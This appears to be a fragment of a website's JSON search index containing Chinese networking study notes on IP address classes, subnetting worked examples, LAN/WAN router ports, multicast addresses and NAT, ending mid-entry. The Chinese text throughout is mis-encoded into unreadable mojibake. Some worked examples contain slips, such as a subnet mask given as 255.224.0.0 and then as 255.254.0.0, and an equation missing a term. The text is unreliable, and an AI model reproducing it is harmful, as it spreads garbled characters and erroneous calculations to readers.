åœ°å€åˆ†ç±»ç³»ç»ŸæŠŠIPåœ°å€åˆ’åˆ†ä¸ºä¸åŒçš„åœ°å€ç±»ï¼š Aç±»åœ°å€ ï¼šIPåœ°å€çš„å‰ 8 ä½è¡¨ç¤ºç½‘ç»œIDï¼Œå24ä½è¡¨ç¤ºä¸»æœºID Bç±»åœ°å€ ï¼šIPåœ°å€çš„å‰ 16 ä½è¡¨ç¤ºç½‘ç»œIDï¼Œå16ä½è¡¨ç¤ºä¸»æœºID Cç±»åœ°å€ ï¼šIPåœ°å€çš„å‰ 24 ä½è¡¨ç¤ºç½‘ç»œIDï¼Œå8ä½è¡¨ç¤ºä¸»æœºID ä½¿ç”¨çš„ä½æ•°è¶Šå¤šï¼ŒåŒ…å«çš„ç»„åˆå°±è¶Šå¤šï¼Œå¯çŸ¥Aç±»åœ°å€è¾ƒå°‘çš„ç½‘ç»œIDï¼Œ ä½†æ¯ä¸ªç½‘ç»œéƒ½å…·æœ‰å¤§é‡çš„å¯ç”¨ä¸»æœºIDã€‚ é‚£è®¡ç®—æœºæˆ–è·¯ç”±å™¨æ˜¯å¦‚ä½•å°†ä¸€ä¸ªIPåœ°å€è§£é‡Šä¸ºAç±»ã€Bç±»è¿˜æ˜¯Cç±»å‘¢ï¼Ÿ å…¶å®äºŒè¿›åˆ¶çš„å‰å‡ ä½å°±æ˜¯ç”¨æ¥åœ°å€åˆ†ç±». æ³¨è§£ Dç±»åœ°å€ï¼Œå‰4ä½ä¸º1110ï¼Œç”¨äºå¤šæ’­ï¼ˆç»„æ’­ï¼‰ Eç±»åœ°å€ï¼Œå‰5ä½ä¸º11110ï¼Œå®éªŒæ€§è´¨çš„ï¼Œä¸ç”¨äºç”Ÿäº§ç¯å¢ƒ æ’é™¤åœ°å€ æŒ‡çš„æ˜¯ ç§æœ‰IPåœ°å€ ï¼Œç”¨äºæœ¬åœ°å±€åŸŸç½‘çš„IPåœ°å€åˆ†é… ç‰¹æ®Šçš„IPåœ°å€ å…¨0 ä¸»æœºIDï¼šè¡¨ç¤º ç½‘ç»œæœ¬èº« ï¼Œå¦‚IPåœ°å€129.152.0.0æ˜¯æŒ‡ç½‘ç»œIDä¸º129.152çš„Bç±»ç½‘ç»œ å…¨1 ä¸»æœºIDï¼šè¡¨ç¤º å¹¿æ’­åœ°å€ ï¼Œå¦‚IPåœ°å€129.152.255.255æ˜¯æŒ‡ç½‘ç»œIDä¸º129.152çš„Bç±»ç½‘ç»œçš„å¹¿æ’­åœ°å€ åè¿›åˆ¶ 127å¼€å¤´ çš„åœ°å€ï¼š ç¯å›åœ°å€ ï¼Œç”¨äºæµ‹è¯•è‡ªèº«TCP/IPè½¯ä»¶æ˜¯å¦æ­£å¸¸ï¼Œå¦‚pingè‡ªå·±127.0.0.1 å­ç½‘æ©ç  å­ç½‘æ©ç æ˜¯éœ€è¦é…åˆIPåœ°å€ä¸€èµ·ä½¿ç”¨çš„ï¼Œç”¨äºæŒ‡ç¤ºIPåœ°å€çš„å‰å¤šå°‘æ¯”ç‰¹æ˜¯ç½‘ç»œIDï¼Œåå¤šå°‘æ¯”ç‰¹æ˜¯ä¸»æœºIDã€‚ Aã€Bã€Cç±»åœ°å€å‡æœ‰é»˜è®¤çš„æ©ç ï¼Œä¹Ÿç§°å›ºå®šæ©ç ï¼š å­ç½‘åˆ’åˆ† å­ç½‘åˆ’åˆ†æ˜¯ ä»ä¸»æœºå·å­—æ®µå€Ÿç”¨è‹¥å¹²ä½æ¯”ç‰¹ ï¼Œ æŠŠç‰©ç†ç½‘ç»œåˆ†è§£ä¸ºæ›´å°çš„é€»è¾‘å®ä½“ï¼ˆç§°ä¸ºå­ç½‘ï¼‰çš„ä¸€ç§æ‰‹æ®µï¼Œä»è€Œå¯ä»¥æ›´åŠ å……åˆ†çš„åˆ©ç”¨æœ‰é™çš„IPåœ°å€èµ„æºã€‚ å°†åˆå§‹ç½‘ç»œåˆ†æ®µï¼Œå¿…é¡»è®¾è®¡ä¸€ç§ç¼–å€æ–¹æ¡ˆï¼Œ èƒ½å¤Ÿè¯†åˆ«å‡ºå¤§å‹ç½‘ç»œä¸­çš„æ¯ä¸ªå­ç½‘ã€‚ä¸€å°ç‰¹å®šä¸»æœºå¯ä»¥é€šè¿‡ä»¥ä¸‹ä¸‰é¡¹è¢«å”¯ä¸€è¯†åˆ«ï¼š ç½‘ç»œå· å”¯ä¸€åœ°æŒ‡å®šä¸»æœºæ‰€åœ¨ç½‘è·¯ï¼ˆå¦‚æœç½‘ç»œæ˜¯å…¬å…±äº’è”ç½‘ï¼Œç½‘ç»œå·å°±æ˜¯è¡¨ç¤ºç½‘ç»œçš„åœ°å€ï¼ŒåŒ…æ‹¬äº†å…¶æ‰€æœ‰çš„å­ç½‘ï¼‰ å­ç½‘å· å”¯ä¸€çš„æŒ‡å®šäº†ä¸€ä¸ªå­ç½‘ï¼ˆåˆå§‹ç½‘ç»œå†…éƒ¨çš„å­ç½‘ï¼‰ï¼Œä¸€ä¸ªå­ç½‘å†…éƒ¨åŒ…å«è‹¥å¹²ä¸»æœº ä¸»æœºå· å”¯ä¸€åœ°æŒ‡å®šäº†å­ç½‘å†…çš„æŸå°ä¸»æœº å­ç½‘åˆ’åˆ†çš„å‡ ä¸ªæ­¥éª¤ ç¡®å®šéœ€è¦çš„ å­ç½‘ä¸ªæ•° ç¡®å®šä¸€ä¸ª å­ç½‘å†…å¯èƒ½çš„æœ€å¤šä¸»æœºæ•°é‡ ç¡®å®šä»ä¸»æœºå·å­—æ®µ å€Ÿç”¨çš„æ¯”ç‰¹æ•° ï¼Œç”¨äºåˆ›å»ºå­ç½‘å·å­—æ®µ ç¡®å®šä¸»æœºå·å­—æ®µéœ€è¦ ä¿ç•™çš„æ¯”ç‰¹æ•° ï¼ˆä¸èƒ½è¢«å­ç½‘å­—æ®µå€Ÿç”¨çš„æ¯”ç‰¹æ•°ï¼‰ ç¡®å®š åŸå§‹ ç½‘ç»œå·å­—æ®µå’Œä¸»æœºå·å­—æ®µçš„æ¯”ç‰¹æ•° æ£€æŸ¥ä»¥ç¡®ä¿è¢«å€Ÿç”¨çš„æ¯”ç‰¹æ•° æ²¡æœ‰è¶…è¿‡ è¢«ä¿ç•™çš„æ¯”ç‰¹æ•°ï¼ˆå³æ£€æŸ¥å­ç½‘åˆ’åˆ†é—®é¢˜æ˜¯å¯è§£çš„ï¼‰ è®¾ç½® å­ç½‘å·å­—æ®µçš„æœ€ä½³é•¿åº¦ ï¼ŒåŒ…æ‹¬ä¸ºæœªæ¥å¢é•¿é¢„ç•™ç©ºé—´ åˆ›å»ºä¸€ä¸ªä¿®æ”¹ï¼ˆè‡ªå®šä¹‰ï¼‰çš„ å­ç½‘æ©ç  ç¡®å®š æœ‰æ•ˆçš„å­ç½‘å· ç¡®å®šæ¯ä¸ªå­ç½‘çš„ IPåœ°å€æœ‰æ•ˆèŒƒå›´ å­ç½‘åˆ’åˆ†ä¸¾ä¾‹ é—®é¢˜ï¼šæœ‰ä¸€ä¸ªCç±»åœ°å€193.200.35.0ï¼Œåˆ†é…ç»™æŸä¸ªç»„ç»‡ï¼Œ è¯¥ç»„ç»‡éœ€è¦ä¸¤ä¸ªå­ç½‘ï¼Œæ¯ä¸ªå­ç½‘çš„ä¸»æœºæ•°ä¸ä¼šè¶…è¿‡30å°ã€‚ åˆ†æï¼šå­ç½‘æ•°S=2ï¼Œæ¯ä¸ªå­ç½‘å†…æœ€å¤šçš„ä¸»æœºæ•°H=30ï¼ŒCç±»åœ°å€çš„ä¸»æœºä½æ¯”ç‰¹T=8 ç¡®å®š å­ç½‘ä¸ªæ•° ï¼ŒS=2 ç¡®å®šä¸€ä¸ª å­ç½‘å†…å¯èƒ½çš„æœ€å¤šä¸»æœºæ•°é‡ ï¼ŒH=30 æ±‚è§£2&#94;s - 2 >= Sçš„æœ€å°æ•´æ•°sï¼Œè§£å¾—s=2ï¼Œå³ä»ä¸»æœºå·å­—æ®µ å€Ÿç”¨çš„æ¯”ç‰¹æ•° ï¼Œç”¨äºåˆ›å»ºå­ç½‘å·å­—æ®µ æ±‚è§£2&#94;h - 2 >= Hçš„æœ€å°æ•´æ•°hï¼Œè§£å¾—h=5ï¼Œå³ä¸»æœºå·å­—æ®µéœ€è¦ ä¿ç•™çš„æ¯”ç‰¹æ•° ç¡®å®š åŸå§‹ ç½‘ç»œå·å­—æ®µå’Œä¸»æœºå·å­—æ®µçš„æ¯”ç‰¹æ•°ï¼Œç½‘ç»œå·å­—æ®µä¸º24ï¼Œä¸»æœºå·å­—æ®µT=8 å› ä¸ºs + h = 2 +5 =7 < 8ï¼Œå³å€Ÿç”¨çš„æ¯”ç‰¹æ•° æ²¡æœ‰è¶…è¿‡ è¢«ä¿ç•™çš„æ¯”ç‰¹æ•°ï¼Œé—®é¢˜å¯è§£ ç”±äº7 < 8ï¼Œå¹¶ä¸”r = T - s - h = 1ï¼Œå› è€Œå¯å°† råˆ†é…ç»™sæˆ–hï¼Œé€šå¸¸æƒ…å†µä¸‹å­ç½‘çš„æ•°é‡ç›¸æ¯”å­ç½‘å†…ä¸»æœºçš„æ•°é‡æ›´å®¹æ˜“è€—å°½ï¼Œ å› è€Œå°†råˆ†é…ç»™sï¼Œå³s = s + r = 2 + 1 =3ï¼Œæ­¤æ—¶s + h = 3 + = 8 = T åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„ å­ç½‘æ©ç  ï¼Œé»˜è®¤Cç±»åœ°å€çš„å­ç½‘æ©ç ä¸º255.255.255. 0 ï¼Œ éœ€è¦è®¡ç®—ä¸€ä¸ªæ–°å€¼ä»£æ›¿å…¶0å­—èŠ‚ï¼Œè®¡ç®—256 - 2 &#94; (8 - s) = 256 - 2 &#94; 5 = 256 - 32 = 224ï¼ˆ å‰sä½å…¨ç½®ä¸º1ï¼Œä¹Ÿå°±æ˜¯å‰ä¸‰ä½å…¨ç½®ä¸º1 ï¼‰ï¼Œ æ‰€ä»¥è‡ªå®šä¹‰å­ç½‘æ©ç ä¸º 255.255.255.224 ç¡®å®š æœ‰æ•ˆçš„å­ç½‘å· ï¼Œè¿åŠ¿ç½‘ç»œåœ°å€ä¸º193.200.35. 0 ï¼Œå°†2 &#94; (8 - s)= 2 &#94; 5 = 32åŠ åˆ°å…¶0å­—èŠ‚ä¸Šï¼Œ å¾—åˆ°ç¬¬ä¸€ä¸ªå­ç½‘çš„ç½‘ç»œåœ°å€ä¸º193.200.35. 32 ã€‚ç»§ç»­åœ¨æ­¤å­—èŠ‚ä¸ŠåŠ ä¸Š2 &#94; (8 - s)ï¼Œ ç›´è‡³å…¶ç­‰äºè‡ªå®šä¹‰çš„å­ç½‘æ©ç ï¼Œå…·ä½“å¦‚ä¸‹ï¼š ç¡®å®šæ¯ä¸ªå­ç½‘çš„ IPåœ°å€æœ‰æ•ˆèŒƒå›´ ï¼Œå…ˆè®¡ç®—ç¬¬ä¸€ä¸ªå­ç½‘ï¼Œ å…¶åœ°å€ä¸º193.200.35. 33 ï¼Œ æ‰€ä»¥å…¶æœ‰æ•ˆèµ·å§‹åœ°å€ä¸º193.200.35. 33 ï¼Œ å­ç½‘å†…å¯ä»¥æœ‰ 2&#94;h - 2 = 2&#94;5 - 2 = 30ä¸ªIPåœ°å€ï¼Œæ‰€ä»¥ç»“æŸåœ°å€ä¸º193.200.35. 62 æ³¨è§£ æ¯ä¸ªå­ç½‘çš„æœ‰æ•ˆ èµ·å§‹ IPä¸º å­ç½‘åœ°å€+1 ï¼Œ æ¯ä¸ªå­ç½‘çš„æœ‰æ•ˆ ç»“æŸ IPä¸º å­ç½‘åœ°å€+å­ç½‘å†…IPæ€»æ•° ï¼Œ ä¹Ÿä¸º ä¸‹ä¸€ä¸ªå­ç½‘åœ°å€-2 ï¼Œä¸­é—´è·³è¿‡çš„ä¸€ä¸ªIPåœ°å€ä¸ºå­ç½‘çš„ å¹¿æ’­åœ°å€ ä¸€äº›é¢˜ç›® ç»™å®šIPåœ°å€`167.77.88.99`å’Œæ©ç `255.255.255.192`ï¼Œæ±‚å­ç½‘å·ã€å¹¿æ’­åœ°å€ã€æœ‰æ•ˆIPåœ°å€ã€‚ åˆ†æï¼š IPåœ°å€---->167.77.88.99--> 10100111.01001101.01011000.01100011 æ©ç -->255.255.255.192-->11111111.11111111.11111111.11000000 å¯¹åº”ä½æ±‚ç§¯--------------------> 10100111.01001101.01011000.01000000--> 167.77.88.64 ï¼ˆ å­ç½‘å· ï¼‰ï¼ˆå°±æ˜¯andï¼‰ å¹¿æ’­åœ°å€**(å­ç½‘ä¸»æœºå…¨1)---> 10100111.01001101.01011000.01111111-->**167.77.88.127 æœ‰æ•ˆIP**(é™¤å»å­ç½‘æœ¬èº«å’Œå¹¿æ’­åœ°å€):**167.77.88.65~167.77.88.126 ä¸€ä¸ªå­ç½‘ç½‘æ®µåœ°å€ä¸º5.32.0.0ï¼Œæ©ç ä¸º255.224.0.0ç½‘ç»œï¼Œæ±‚å®ƒå…è®¸çš„æœ€å¤§ä¸»æœºåœ°å€ã€‚ åˆ†æï¼š ç½‘æ®µ------->5.32.0.0-->00000101.00100000.00000000.00000000 æ©ç -->255.254.0.0-->11111111.11100000.00000000.00000000-->ä¸»æœºä½ä¸º21ä½ï¼ˆ0ä½ï¼‰ æœ€å¤§ä¸»æœºåœ°å€ ---------->00000101.00111111.11111111.11111110-->5.63.255.254 ï¼ˆå¹¿æ’­åœ°å€å‡ä¸€ï¼Œä¹Ÿå°±æ˜¯å­ç½‘ä¸»æœºå…¨1å‡ä¸€ï¼‰ 188.188.0.111ï¼Œ188.188.5.222ï¼Œå­ç½‘æ©ç éƒ½è®¾ä¸º255.255.254.0ï¼Œåœ¨åŒä¸€ç½‘æ®µå—ï¼Ÿ åˆ†æï¼š IP1---->188.188.0.111-->10111100.10111100.00000000.01101111 IP2---->188.188.5.222-->10111100.10111100.00000101.11011010 æ©ç -->255.255.254.0-->11111111.11111111.11111110.00000000 IPåˆ†åˆ«ä¸æ©ç ä½œæ±‚ç§¯è¿ç®—ï¼š 10111100.10111100.00000000.00000000 10111100.10111100.00000100.00000000 ç½‘ç»œæ ‡è¯†ä¸ä¸€æ ·ï¼Œå³ä¸åœ¨åŒä¸€ç½‘æ®µ å‚è€ƒ:: ã€ŠTCP/IPå…¥é—¨ç»å…¸ ç¬¬6ç‰ˆã€‹/ ä¹”Â·å¡è¨å¾·ï¼ˆJoe Casadï¼‰ ã€Šè®¡ç®—æœºç½‘ç»œåŸºç¡€æ•™ç¨‹ï¼šåŸºæœ¬æ¦‚å¿µåŠç»å…¸é—®é¢˜è§£æã€‹/ çº³æ‹‰è¾›å“ˆÂ·å¡é²æ›¼å¸Œ ç­‰ https://blog.csdn.net/hawht/art","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-IP-address-and-subnet-division.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-IP-address-and-subnet-division.html"},{"title":"LANä¸WAN","text":"WANç«¯å£ç”¨äºè¿æ¥è‡³Internet LANç«¯å£ç”¨äºè¿æ¥è‡³å±€åŸŸç½‘è®¾å¤‡ LANç«¯å£è¿æ¥ä½ è‡ªå·±çš„è®¾å¤‡ï¼Œç¬”è®°æœ¬/å°å¼æœº/æ‰“å°æœºç­‰ï¼› æ— çº¿è·¯ç”±å™¨é…ç½®çš„wifiåˆ™ç›¸å½“äºLANç«¯å£ï¼Œè¿æ¥è‡ªå·±çš„æ— çº¿è®¾å¤‡ï¼Œæ‰‹æœº/ipad/ç¬”è®°æœ¬ç­‰ï¼› å½“WANç«¯å£è¿ä¸Šå¤–ç½‘ï¼ŒLANç«¯å£ä¸Šçš„å„ä¸ªè®¾å¤‡å’Œè·¯ç”±å™¨ä¸€èµ·ç»„æˆäº†ä¸€ä¸ªå°å‹å±€åŸŸç½‘ï¼Œè¿™ä¸ªå±€åŸŸç½‘å†…çš„è®¾å¤‡å¯ä»¥äº’ç›¸å‘ç°ï¼Œè®¿é—®ã€‚ æ™®é€šè·¯ç”±å™¨çš„LANç«¯å£åªæœ‰4ä¸ªï¼Œå½“ä¸å¤Ÿç”¨çš„æ—¶å€™æ€ä¹ˆåŠå‘¢ï¼Ÿå˜ç›¸æ‰©å……LANç«¯å£çš„åŠæ³•ï¼š äº¤æ¢æœºï¼Œè¿LANå£ï¼Œäº¤æ¢æœºçš„ä½œç”¨å¯ä»¥ç®€å•ç†è§£ä¸ºå¸®ä½ æŠŠ4ä¸ªLANç«¯å£æ‰©å±•åˆ°Nä¸ªï¼› è·¯ç”±å™¨ï¼Œè¿LANå£ï¼Œç¬¬äºŒä¸ªè·¯ç”±å™¨å°±æ˜¯å½“å‰å±€åŸŸç½‘çš„å­å±€åŸŸç½‘ï¼› å°±è·Ÿå®¶é‡Œçš„å±€åŸŸç½‘ä¸€æ ·ï¼Œç”µè„‘ä¸æ˜¯ç›´æ¥è¿ä¸Šè‹±ç‰¹ç½‘ï¼Œè€Œæ˜¯ä½œä¸ºå­ç½‘è¿ä¸Šå»çš„ï¼Œè¿™æ ·å¤šä¸ªè®¾å¤‡å¯ä»¥å…±ç”¨ä¸€ä¸ªå…¬ç½‘IPã€‚ è·¯ç”±å™¨è¿˜å¯ä»¥å½“äº¤æ¢æœºç”¨ å½“ä¸ä½¿ç”¨è·¯ç”±å™¨çš„WANç«¯å£ï¼Œåªä½¿ç”¨LANç«¯å£æ—¶ï¼Œå°±å¯ä»¥çœ‹æˆæ˜¯ä¸ªäº¤æ¢æœºäº†ï¼Œ å½“ç„¶æ­¤æ—¶LANç«¯å£IPè¦è®¾ç½®æˆå±€åŸŸç½‘æ®µå†…çš„IPï¼Œå¹¶ä¸”æœ€å¥½é…ç½®å…³é—­DHCPï¼› å‡è®¾ åŸè·¯ç”±å™¨IPä¸º192.168.1.1 æ©ç ä¸º255.255.255.0 å¯ç”¨ç½‘æ®µä¸º192.168.1.2~192.168.1.254ï¼Œ é‚£ä¹ˆä½ ä½œäº¤æ¢æœºç”¨é€”çš„è·¯ç”±å™¨ LANç«¯å£IP åº”è®¾ç½®ä¸º 192.168.1.2~192.168.1.254 èŒƒå›´å†…çš„IPï¼› å¦‚æœä½ æƒ³è¦å±€åŸŸç½‘ä¸­å†æ¥å…¥å±€åŸŸç½‘ï¼Œåˆ™åº”è®¾ç½®WANç«¯å£IPè‡ªåŠ¨è·å–ï¼Œ LANç«¯å£IPåº”ä¸åŸè·¯ç”±å™¨çš„IPåœ¨ä¸åŒç½‘æ®µï¼Œå¦‚192.168.2.1ï¼‰ é—®é¢˜-åŒå±€åŸŸç½‘çš„ä¸¤ä¸ªè·¯ç”±å™¨ä¸‹çš„ç”µè„‘æƒ³è¦pingé€š æ³¨è§£ è·¯ç”±å™¨çš„ç½‘æ®µä¸èƒ½ç›¸åŒ æ–¹æ³•1: bè·¯ç”±å™¨ çš„lanå£ è¿ aè·¯ç”±å™¨çš„lanå£ï¼ˆè®°å¾—å…³é—­ä¸€ä¸ªè·¯ç”±çš„dhcpæœåŠ¡ï¼‰ æ–¹æ³•2: aè·¯ç”±å™¨é…ç½®è·¯ç”±è§„åˆ™ï¼Œä½¿bç½‘æ®µçš„æœºå™¨éƒ½èµ°bè·¯ç”±ï¼ˆéœ€è¦aè·¯ç”±æœ‰è¿™ä¸ªåŠŸèƒ½ï¼‰ å…¶ä»–: å‚è€ƒ: https://www.zhihu.com/question/20738115","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-LAN-and-Wan.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-LAN-and-Wan.html"},{"title":"å¤šæ’­åœ°å€","text":"å¤šæ’­åœ°å€(Multicast Address)æ˜¯ä¸€ç§ç‰¹æ®Šçš„ IP åœ°å€,ç”¨äºåŒæ—¶å‘å¤šå°ä¸»æœºå‘é€ UDP æ•°æ®åŒ…ã€‚ å¤šæ’­åœ°å€æœ‰ä»¥ä¸‹ç‰¹å¾: ä»¥ 224.0.0.0 åˆ° 239.255.255.255 ä¹‹é—´çš„ IP åœ°å€ä¸ºå¤šæ’­åœ°å€èŒƒå›´ã€‚ å¤šæ’­åœ°å€ä¸å¯¹åº”å…·ä½“çš„ç½‘ç»œæ¥å£æˆ–ä¸»æœº,å®ƒä»£è¡¨ä¸€ç»„ç›®æ ‡æ¥æ”¶è€…ã€‚ å‘é€åˆ°å¤šæ’­åœ°å€çš„æ•°æ®åŒ…ä¼šè¢«è·¯ç”±å™¨å’Œäº¤æ¢æœºè‡ªåŠ¨å¤åˆ¶å¹¶æ¨é€åˆ°å­ç½‘å†…çš„æ‰€æœ‰è®¡ç®—æœºã€‚ æ¯å°ä¸»æœºéƒ½è¿è¡Œä¸€ä¸ªå¤šæ’­æˆå‘˜å¤„ç†è¿›ç¨‹,è¯¥è¿›ç¨‹å¤„ç†å‘é€åˆ°å¤šæ’­åœ°å€çš„æ•°æ®åŒ…ã€‚ æƒ³æ¥æ”¶å¤šæ’­åœ°å€çš„æ•°æ®,ä¸»æœºéœ€è¦åŠ å…¥åˆ°è¿™ä¸ªå¤šæ’­ç»„ã€‚æœªåŠ å…¥çš„ä¸»æœºä¸ä¼šæ¥æ”¶è¿™äº›æ•°æ®åŒ…ã€‚ æ‰€ä»¥,å¤šæ’­åœ°å€å…è®¸ä¸€å°ä¸»æœºå‘å¤šå°ä¸»æœºåŒæ—¶å‘é€æ•°æ®åŒ…,æ¥æ”¶æ•°æ®çš„ä¸»æœºå¯ä»¥è‡ªåŠ¨åŠ å…¥å’Œç¦»å¼€å¤šæ’­ç»„ã€‚ ä½¿ç”¨å¤šæ’­åœ°å€çš„å…¸å‹åº”ç”¨æœ‰: è§†é¢‘ä¼šè®®å’Œæµåª’ä½“:å°†è§†é¢‘æµå‘é€åˆ°å¤šæ’­åœ°å€,å¤šä¸ªå®¢æˆ·ç«¯åŒæ—¶æ”¶çœ‹ã€‚ ç½‘ç»œæ¸¸æˆ:å°†æ¸¸æˆæ•°æ®åŒ…å‘é€åˆ°å¤šæ’­åœ°å€,å¤šä¸ªæ¸¸æˆå®¢æˆ·ç«¯åŒæ—¶æ¥æ”¶å’Œå“åº”ã€‚ UPnP:UPnP è®¾å¤‡ä½¿ç”¨å¤šæ’­åœ°å€ 239.255.255.250 å‘é€æœåŠ¡é€šå‘Š,è¢«æ§åˆ¶ç‚¹åŒæ—¶æ¥æ”¶ã€‚ è·¯ç”±å™¨ç½‘ç»œé…ç½®:æœ‰äº›è·¯ç”±å™¨ä½¿ç”¨å¤šæ’­åœ°å€ä¼ é€é…ç½®æ•°æ®,å¤šä¸ªè·¯ç”±å™¨å¯ä»¥åŒæ—¶æ¥æ”¶ã€‚ ç­‰ç­‰ã€‚","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-Multi--broadcast-address.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-Multi--broadcast-address.html"},{"title":"ç½‘ç»œä¸­çš„NATæ¨¡å¼","text":"å‚è€ƒ: https://www.cnblogs.com/linhaostudy/p/10355614.html é˜…è¯»ç›®å½• æ¦‚è¿° åˆ†ç±» NATçš„ä¸‰ä¸ªæ–¹å‘ï¼š NATçš„åº”ç”¨åˆ†ç±»ï¼š å·¥ä½œåŸç† NAT-åŸç† NAT-åŸºæœ¬åœ°å€è½¬æ¢åŸç† NATä¸­çš„è½¬æ¢æ–¹å¼: NAT-åŸºæœ¬IPåœ°å€è½¬æ¢åŸç† å†…éƒ¨åœ°å€NAT-è½¬æ¢åŸç† ä¸€ä¸ªç®€å•çš„NAT-è½¬æ¢ç¤ºä¾‹ å¤–éƒ¨åœ°å€NAT-è½¬æ¢åŸç† æ¦‚è¿° NATè‹±æ–‡å…¨ç§°æ˜¯\"Network Address Translation\"ï¼Œä¸­æ–‡æ„æ€æ˜¯\"ç½‘ç»œåœ°å€è½¬æ¢\"ï¼Œ å®ƒæ˜¯ä¸€ä¸ªIETF(Internet Engineering Task Force, Internetå·¥ç¨‹ä»»åŠ¡ç»„)æ ‡å‡†ï¼Œ å…è®¸ä¸€ä¸ªæ•´ä½“æœºæ„ä»¥ä¸€ä¸ªå…¬ç”¨IPï¼ˆInternet Protocolï¼‰åœ°å€å‡ºç°åœ¨Internetä¸Šã€‚ é¡¾åæ€ä¹‰ï¼Œå®ƒæ˜¯ä¸€ç§æŠŠå†…éƒ¨ç§æœ‰ç½‘ç»œåœ°å€ï¼ˆIPåœ°å€ï¼‰ç¿»è¯‘æˆåˆæ³•ç½‘ç»œIPåœ°å€çš„æŠ€æœ¯ã€‚ NAT å¯ä»¥è®©é‚£äº›ä½¿ç”¨ç§æœ‰åœ°å€çš„å†…éƒ¨ç½‘ç»œè¿æ¥åˆ°Internetæˆ–å…¶å®ƒIPç½‘ç»œä¸Šã€‚ NATè·¯ç”±å™¨åœ¨å°†å†…éƒ¨ç½‘ç»œçš„æ•°æ®åŒ…å‘é€åˆ°å…¬ç”¨ç½‘ç»œæ—¶ï¼Œåœ¨IPåŒ…çš„æŠ¥å¤´æŠŠç§æœ‰åœ°å€è½¬æ¢æˆåˆæ³•çš„IPåœ°å€ã€‚ RFC1918è§„å®šäº†ä¸‰å—ä¸“æœ‰çš„åœ°å€ï¼Œä½œä¸ºç§æœ‰çš„å†…éƒ¨ç»„ç½‘ä½¿ç”¨: Aç±»ï¼š10.0.0.0â€”10.255.255.255 10.0.0.0/8 Bç±»ï¼š172.16.0.0â€”172.31.255.255 172.16.0.0/12 Cç±»ï¼š192.168.0.0â€”192.168.255.255 192.168.0.0/16 è¿™ä¸‰å—ç§æœ‰åœ°å€æœ¬èº«æ˜¯å¯è·¯ç”±çš„ï¼Œåªæ˜¯å…¬ç½‘ä¸Šçš„è·¯ç”±å™¨ä¸ä¼šè½¬å‘è¿™ä¸‰å—ç§æœ‰åœ°å€çš„æµé‡ï¼› å½“ä¸€ä¸ªå…¬å¸å†…éƒ¨é…ç½®äº†è¿™äº›ç§æœ‰åœ°å€åï¼Œå†…éƒ¨çš„è®¡ç®—æœºåœ¨å’Œå¤–ç½‘é€šä¿¡æ—¶ï¼Œ å…¬å¸çš„è¾¹ç•Œè·¯ç”±ä¼šé€šè¿‡NATæˆ–è€…PATæŠ€æœ¯ï¼Œå°†å†…éƒ¨çš„ç§æœ‰åœ°å€è½¬æ¢æˆå¤–ç½‘IPï¼Œ å¤–éƒ¨çœ‹åˆ°çš„æºåœ°å€æ˜¯å…¬å¸è¾¹ç•Œè·¯ç”±è½¬æ¢è¿‡çš„å…¬ç½‘IPåœ°å€ï¼Œè¿™åœ¨æŸç§æ„ä¹‰ä¸Šä¹Ÿå¢åŠ äº†å†…éƒ¨ç½‘ç»œçš„å®‰å…¨æ€§ã€‚ Basic NAT æ˜¯ä¸€ç§æŠŠä¸€ç»„IPåœ°å€æ˜ å°„æˆå¦ä¸€ç»„IPåœ°å€çš„æ–¹æ³•ï¼Œæ˜ å°„çš„è¿‡ç¨‹åœ¨IPä¸­ç»§è®¾å¤‡ä¸Šå®Œæˆï¼Œå¯¹ç”¨æˆ·å®Œå…¨é€æ˜ã€‚ NAPT è¦å¤æ‚ä¸€äº›ï¼Œå®ƒæŠŠè®¸å¤šï¼ˆä¸èƒ½å¤ªå¤šï¼‰IPåœ°å€è¿åŒTCP/UDPç«¯å£å·æ˜ å°„åˆ°å•ç‹¬ä¸€ä¸ªIPåœ°å€å’Œç«¯å£å·ä¸Šã€‚ æ— è®ºæ˜¯Basic NATè¿˜æ˜¯NAPTéƒ½æä¾›ä¸€ç§æŠŠå†…éƒ¨çš„ç§æœ‰åœ°å€è½¬æ¢æˆåœ¨å…¬ç½‘ä¸Šå¯ç”¨çš„å…¨çƒå”¯ä¸€IPåœ°å€çš„æ–¹æ³•ã€‚ NATåˆ†ç±» NATæœ‰ä¸‰ç§ç±»å‹ï¼š é™æ€NAT(Static NAT)ï¼ˆä¸€å¯¹ä¸€ï¼‰ã€‚ å°†å†…éƒ¨ç½‘ç»œçš„ç§æœ‰IPåœ°å€è½¬æ¢ä¸ºå…¬æœ‰IPåœ°å€ï¼ŒIPåœ°å€å¯¹æ˜¯ä¸€å¯¹ä¸€çš„ï¼Œæ˜¯ä¸€ç›´ä¸å˜çš„ï¼› åŠ¨æ€åœ°å€NAT(Pooled NAT)ï¼ˆå¤šå¯¹å¤šï¼‰ã€‚ å°†å†…éƒ¨ç½‘ç»œçš„ç§æœ‰IPåœ°å€è½¬æ¢ä¸ºå…¬ç”¨IPåœ°å€æ—¶ï¼ŒIPåœ°å€æ˜¯ä¸ç¡®å®šï¼Œéšæœºçš„ã€‚ æ‰€æœ‰è¢«æˆæƒè®¿é—®Internetçš„ç§æœ‰IPåœ°å€å¯éšæœºè½¬æ¢ä¸ºä»»ä½•æŒ‡å®šåˆæ³•çš„IPåœ°å€ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦æŒ‡å®šå“ªäº›å†…éƒ¨åœ°å€å¯ä»¥è¿›è¡Œè½¬æ¢ï¼Œä»¥åŠç”¨å“ªäº›åˆæ³•åœ°å€ä½œä¸ºå¤–éƒ¨åœ°å€æ—¶ï¼Œå°±å¯ä»¥è¿›è¡ŒåŠ¨æ€NATè½¬æ¢ã€‚ åŠ¨æ€NATæ˜¯åœ¨è·¯ç”±å™¨ä¸Šé…ç½®ä¸€ä¸ªå¤–ç½‘IPåœ°å€æ± ï¼Œå½“å†…éƒ¨æœ‰è®¡ç®—æœºéœ€è¦å’Œå¤–éƒ¨é€šä¿¡æ—¶ï¼Œ å°±ä»åœ°å€æ± 